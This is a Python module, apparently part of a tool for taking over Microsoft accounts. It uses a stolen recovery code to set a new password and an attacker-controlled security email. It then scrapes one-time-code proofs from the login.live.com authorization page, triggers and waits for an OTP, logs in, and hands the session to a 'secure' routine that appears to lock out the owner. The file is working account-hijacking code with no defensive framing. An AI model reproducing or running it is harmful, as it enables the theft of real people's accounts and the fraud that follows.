import asyncio, re, secrets, time, json, logging
from urllib.parse import quote_plus
from typing import Any, Dict
from .recoverycodesecure import recovery_code_secure
from .login import login
from utils.sendotp import sendotp
from .secure import secure as _secure

_AUTH_URL = "https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&scope=openid&redirect_uri=https://www.office.com/landingv2&response_type=code&msproxy=1&username="
_OTC_PROOFS_RE = re.compile(r'"OtcLoginEligibleProofs"\s*:\s*(\[\s*{[\s\S]*?}\s*\])')

async def _get_proofs(client, email: str, tries: int = 3, delay: float = 1.0):
    for attempt in range(tries):
        r = client.get(_AUTH_URL + quote_plus(email))
        m = _OTC_PROOFS_RE.search(r.text)
        if m and m.group(1):
            try:
                proofs = json.loads(m.group(1))
                if isinstance(proofs, list) and proofs:
                    return proofs
            except Exception:
                pass
        if attempt < tries - 1:
            await asyncio.sleep(delay)
    return None

async def _wait_otp(fetch_fn, timeout: float = 60.0, interval: float = 2.0):
    end = time.time() + timeout
    while time.time() < end:
        c = fetch_fn()
        if c:
            return c
        await asyncio.sleep(interval)
    return None

def _default_fetch():
    return None

async def securerecoverycode(client, email: str, recovery_code: str, settings: Any):
    domain = getattr(settings, "domain", None) or "outlook.com"
    security_email = f"{secrets.token_hex(6)}@{domain}"
    password = secrets.token_urlsafe(12)
    rec = recovery_code_secure(client, email, recovery_code, security_email, password)
    if not rec:
        return None
    if rec.get("error") in {"1300", "6001"}:
        return {"error": rec["error"]}
    await asyncio.sleep(5)
    proofs = await _get_proofs(client, email)
    if not proofs:
        return {"status": "otp_fatigue", "recoveryCode": rec["recoveryCode"], "email": email, "security_email": security_email, "password": password}
    proof = proofs[0]
    if not sendotp(email, proof["data"]):
        return {"status": "otp_fatigue", "recoveryCode": rec["recoveryCode"], "email": email, "security_email": security_email, "password": password}
    code = await _wait_otp(_default_fetch, 60, 2)
    if not code:
        return {"status": "otp_fatigue", "recoveryCode": rec["recoveryCode"], "email": email, "security_email": security_email, "password": password}
    msaauth = login(client, email, proof["data"], code)
    if not msaauth:
        return {"status": "proxy_failed", "recoveryCode": rec["recoveryCode"], "email": email, "security_email": security_email, "password": password}
    recovery_data = {"password": password, "security_email": security_email, "recoveryCode": rec["recoveryCode"]}
    return await _secure(client, msaauth, settings, recovery_data)
